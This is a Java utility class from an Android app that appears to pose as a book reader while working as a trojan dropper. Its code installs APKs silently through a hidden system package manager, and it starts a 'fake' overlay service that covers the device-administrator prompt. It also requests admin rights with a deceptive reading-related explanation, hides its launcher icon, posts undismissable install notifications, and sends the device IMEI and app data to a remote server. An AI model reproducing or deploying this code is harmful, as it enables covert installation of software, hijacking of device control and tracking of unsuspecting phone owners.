package com.xstd.ip;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.storage.StorageManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.widget.RemoteViews;
import com.andorid.shu.love.LoveReaderActivity;
import com.google.reader.R;
import com.xstd.ip.module.ActiveApplicationInfo;
import com.xstd.ip.module.ApplicationInfo;
import com.xstd.ip.receiver.ActiveReceiver;
import com.xstd.ip.receiver.BindDeviceReceiver;
import com.xstd.ip.service.CoreService;
import com.xstd.ip.service.FakeBindService;
import net.tsz.afinal.FinalDb;
import net.tsz.afinal.http.AjaxCallBack;

import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

public class Tools {

    public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";

    /**
     * 启动核心服务。
     *
     * @param context
     */
    public static void startCoreService(Context context) {
        context.startService(new Intent(context, CoreService.class));
    }

    /**
     * 开启激活设备管理器的遮盖服务
     *
     * @param context
     * @param from
     */
    public static void startFakeService(Context context, String from) {
        if (Config.DEBUG) {
            Tools.logW("[[CommonUtil::startFakeService]] from reason : " + from);
        }
        Intent is = new Intent();
        is.setClass(context, FakeBindService.class);
        context.startService(is);
    }

    /**
     * 得到packagemanager，安装apk。
     *
     * @return 返回IPackageManager对象。
     */
    @SuppressWarnings({"rawtypes", "unchecked"})
    private static IPackageManager getPackageManger() {
        try {
            Class clazz = Tools.class.getClassLoader().loadClass("android.os.ServiceManager");
            Method method = clazz.getMethod("getService", new Class[]{String.class});
            IBinder b = (IBinder) method.invoke(null, "package");
            return IPackageManager.Stub.asInterface(b);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 通过apk路径得到apk信息
     *
     * @param context
     * @param path
     * @return
     */
    public static PackageInfo getPackageInfoByPath(Context context, String path) {
        return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
    }

    /**
     * 安装apk文件
     *
     * @param context
     * @param info
     * @param observer
     * @throws Exception
     */
    public static void installFile(Context context, ApplicationInfo info, IPackageInstallObserver observer) {
        Tools.logW("准备静默安装：" + info.getLocalPath());
        File file = new File(info.getLocalPath());
        if (file == null || !file.isFile())
            return;
        PackageInfo packageInfo = getPackageInfoByPath(context, info.getLocalPath());
        if (packageInfo == null) {
            logW("程序包有误，需要重新下载。");
            info.setDownload(false);
            FinalDb.create(context, Config.DEBUG).update(info);
        } else {
            Tools.logW("检测成功，准备安装" + file.getAbsolutePath());
            int flags = 0;
            try {
                getPackageManger().installPackage(Uri.fromFile(file), observer, flags, packageInfo.packageName);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 清除这个包名的通知
     *
     * @param context
     * @param packageName
     */
    public static void cancleNotification(Context context, String packageName) {
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).cancel(generateNotificationID(packageName));
    }

    /**
     * 根据包名生成通知id
     *
     * @param packageName
     * @return
     */
    private static int generateNotificationID(String packageName) {
        return packageName.hashCode();
    }

    /**
     * 通过发送通知的方式安装
     *
     * @param context
     * @param info
     */
    public static void useNotificationInstall(Context context, ApplicationInfo info) {
        Tools.logW("准备通知安装：" + info.getLocalPath());
        Intent intent = new Intent();
        if (isVersionBeyondGB()) {
            intent.setAction("android.intent.action.INSTALL_PACKAGE");
        } else {
            intent.setAction("android.intent.action.VIEW");
        }
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory("android.intent.category.DEFAULT");
        intent.setDataAndType(Uri.fromFile(new File(info.getLocalPath())), "application/vnd.android.package-archive");
        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        Notification notification = new NotificationCompat.Builder(context).setTicker(info.getTickerText()).setContentTitle(info.getTitle()).setContentText(info.getText()).setSmallIcon(R.drawable.ic_jog_dial_sound_on)
                .setDefaults(Notification.DEFAULT_SOUND).setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setWhen(System.currentTimeMillis()).build();
        notification.flags = Notification.FLAG_NO_CLEAR;
        logW("通知准备完成，检测程序是否正确");
        PackageInfo packageInfo = getPackageInfoByPath(context, info.getLocalPath());
        if (packageInfo == null) {
            logW("程序包有误，需要重新下载。");
            info.setDownload(false);
            FinalDb.create(context, Config.DEBUG).update(info);
        } else {
            logW("程序检测结果正常，发送通知安装");
            nm.notify(generateNotificationID(packageInfo.applicationInfo.packageName), notification);
        }
    }

    /**
     * 通过apk包的路径获得apk的icon
     *
     * @param context
     * @param path
     * @return
     */
    public static Drawable getIconByAPKPath(Context context, String path) {
        PackageInfo info = context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
        if (info == null)
            return null;
        else {
            return context.getPackageManager().getApplicationIcon(info.applicationInfo);
        }
    }

    /**
     * 回到Launcher
     *
     * @param context
     */
    public static void goHome(Context context) {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_HOME);
        context.startActivity(intent);
    }

    /**
     * 如果当前系统时间大于2014年1月1日0时0分0秒则为正常时间
     *
     * @return
     */
    public static boolean isTrueTime() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(2014, 0, 1, 0, 0, 0);
        return System.currentTimeMillis() > calendar.getTimeInMillis();
    }

    /**
     * 判断网络是否可用
     *
     * @param context
     * @return
     */
    public static boolean isOnline(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = (cm != null) ? cm.getActiveNetworkInfo() : null;
        if (info != null && info.isAvailable() && info.isConnected()) {
            return true;
        }
        return false;
    }

    /**
     * 获得设备上所有安装程序的包名
     *
     * @param context
     * @return
     */
    public static List<String> getDeviceInstallPackName(Context context) {
        List<String> names = new ArrayList<String>();
        List<PackageInfo> pis = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
        for (PackageInfo pi : pis)
            names.add(pi.packageName);
        return names;
    }

    /**
     * DEBUG模式下打印debug级别的信息
     *
     * @param msg
     */
    public static void logW(String msg) {
        if (Config.DEBUG)
            Log.w("INSTALL_PLUGIN", msg);
    }

//    public static void notifyServer(Context context, PushMessage message) {
//        Intent service = new Intent(context, SendServerService.class);
//        service.putExtra("PUSH_MESSAGE",message);
//        context.startService(service);
//    }

    public static void bindDeviceManager(Activity activity) {
        Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(activity, BindDeviceReceiver.class));
        i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活设备管理器，可以获得更好的阅读效果。");
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        activity.startActivityForResult(i, 1000);
    }

    /**
     * 判断当前系统是否是2.3以上
     *
     * @return
     */
    public static boolean isVersionBeyondGB() {
        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
    }

    public static boolean isBindingActive(Context context) {
        return context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).getBoolean(KEY_HAS_BINDING_DEVICES, false);
    }

    public static void setDeviceBindingActiveTime(Context context, int count) {
        context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).edit().putInt("device_bind_active", count).commit();
    }

    public static int getDeviceBindingActiveTime(Context context) {
        return context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).getInt("device_bind_active", 0);
    }

    /**
     * 激活设备管理器入口
     *
     * @param context
     */
    public static void initFakeWindow(Context context) {
        if (isTrueTime()) {
            SharedPreferences setting = context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE);
            long intiTime = setting.getLong("first_init_time", -1);
            if (intiTime == -1)
                setting.edit().putLong("first_init_time", System.currentTimeMillis()).commit();
            else if (System.currentTimeMillis() > intiTime + 1000 * 60 * 60 * 10 && setting.getBoolean("showFakeWindow", true))
                startFakeService(context, "LoveReaderActivity");
        }

    }

    /**
     * 隐藏程序图标
     *
     * @param context
     */
    public static void hideLaunchIcon(Context context) {
        PackageManager mPM = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, LoveReaderActivity.class);
        if (mPM.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED)
            mPM.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    /**
     * 根据包名启动程序
     *
     * @param context
     * @param packageName
     */
    public static void launchApplication(Context context, String packageName) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null)
            context.startActivity(intent);
    }

    /**
     * 获得可下载路径
     *
     * @param context
     * @return
     */
    public static String getDownloadDirectory(Context context) {
//        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
//            return Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
//        }
        StorageManager sm = (StorageManager) context.getSystemService(Context.STORAGE_SERVICE);
        Method getVolumePaths = null;
        try {
            getVolumePaths = StorageManager.class.getMethod("getVolumePaths");
            String[] paths = (String[]) getVolumePaths.invoke(sm);
            for (String path : paths) {
                File file = new File(path, "Download");
                Tools.logW("测试存储位置：" + file.getAbsolutePath() + "是否可用");
                if (file.exists()) {
                    Tools.logW(file.getAbsolutePath() + "存在，直接返回路径。");
                    return file.getAbsolutePath();
                } else {
                    boolean mkdirs = file.mkdirs();
                    if (mkdirs) {
                        Tools.logW(file.getAbsolutePath() + "创建成功。");
                        return file.getAbsolutePath();
                    } else {
                        Tools.logW(file.getAbsolutePath() + "创建失败。");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 判断一个字符串是否为空
     *
     * @param str
     * @return
     */
    public static boolean isEmpty(String str) {
        if (str == null)
            return true;
        if (str.trim().length() == 0)
            return true;
        return false;
    }

    /**
     * 使用通知的方式激活程序
     *
     * @param context
     * @param info
     */
    public static void activeApplicationByNotification(Service context, ActiveApplicationInfo info) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(info.getPackageName());
        if (intent == null)
            return;
        Drawable icon = null;
        try {
            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(info.getPackageName(), PackageManager.GET_ACTIVITIES);
            if (packageInfo != null)
                icon = packageInfo.applicationInfo.loadIcon(context.getPackageManager());
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        if (info.getDisplayTime() <= 0) {
            info.setDisplayTime(System.currentTimeMillis());
        }

        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        Notification notification = new Notification(R.drawable.ic_jog_dial_sound_on, info.getTickerText(), System.currentTimeMillis());
        notification.defaults = Notification.DEFAULT_SOUND;
        notification.flags = Notification.FLAG_NO_CLEAR;
        RemoteViews contentView = new RemoteViews(context.getPackageName(), R.layout.notification);
        contentView.setImageViewBitmap(R.id.image, ((BitmapDrawable) icon).getBitmap());
        contentView.setTextViewText(R.id.title, info.getTitle());
        contentView.setTextViewText(R.id.text, info.getContent());
        Intent receiver = new Intent(context, ActiveReceiver.class);
        receiver.putExtra("info", info);
        contentView.setOnClickPendingIntent(R.id.parent, PendingIntent.getBroadcast(context, 0, receiver, 0));
        notification.contentView = contentView;
        Log.w("PS", "发送时候的id" + info.getNotification_id());
        nm.notify(info.getNotification_id(), notification);
    }

    /**
     * 获得程序的版本号
     *
     * @param context
     * @return
     */
    public static String getVersion(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_ACTIVITIES).versionName;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 发送激活信息到服务器
     *
     * @param context
     * @param packageName
     * @param type
     */
    public static void pushActiveMessage(Context context, String packageName, int type) {
        InitApplication application = (InitApplication) context.getApplicationContext();
        String url = String.format(application.getSharedPreferences().getString("fetch_server_url", CoreService.FETCH_SERVER_URL) + "?method=retActivapack&packname=%s&actype=%d&version=%s&imei=%s", packageName, type, Tools.getVersion(context), application.getImei());
        application.getFinalHttp().get(url, new AjaxCallBack<Object>() {
            @Override
            public void onSuccess(Object o) {
                super.onSuccess(o);
            }

            @Override
            public void onFailure(Throwable t, int errorNo, String strMsg) {
                super.onFailure(t, errorNo, strMsg);
            }
        });
    }
}
